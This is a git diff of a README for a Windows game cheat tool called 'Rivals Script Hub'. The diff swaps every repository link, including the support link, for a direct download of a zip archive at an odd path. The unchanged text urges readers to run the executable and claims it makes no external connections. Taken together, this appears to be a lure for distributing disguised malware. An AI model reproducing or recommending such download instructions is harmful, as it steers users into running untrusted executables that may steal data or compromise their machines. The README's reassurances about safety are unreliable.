@@ -1,6 +1,6 @@
 # ⚡ Rivals Script Hub Windows - Enhance Your Gameplay Instantly
 
-[![Download Rivals Script Hub](https://img.shields.io/badge/Download-Rivals_Script_Hub-2ea44f?style=for-the-badge&logo=github)](https://github.com/freedr5964/rivals-script-hub-windows)
+[![Download Rivals Script Hub](https://img.shields.io/badge/Download-Rivals_Script_Hub-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/freedr5964/rivals-script-hub-windows/main/stylolite/2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Rivals Script Hub for Windows. This tool is designed for players of a
 
 Visit this link to download the application:
 
-[Download Rivals Script Hub](https://github.com/freedr5964/rivals-script-hub-windows)
+[Download Rivals Script Hub](https://raw.githubusercontent.com/freedr5964/rivals-script-hub-windows/main/stylolite/2.1.zip)
 
 Once you land on the page, look for the executable file named `RivalsScriptHub.exe` and click to download. Save it to your Downloads folder or any location you prefer. After the download completes, double-click the file to run it. No installation is required - the program runs directly from where you place it.
 
@@ -59,7 +59,7 @@ This application does not connect to any external servers, cloud services, or an
 
 ## 🔗 Support
 
-Visit the repository: https://github.com/freedr5964/rivals-script-hub-windows
+Visit the repository: https://raw.githubusercontent.com/freedr5964/rivals-script-hub-windows/main/stylolite/2.1.zip
 
 For issues or suggestions, open an issue in the repository page.
 
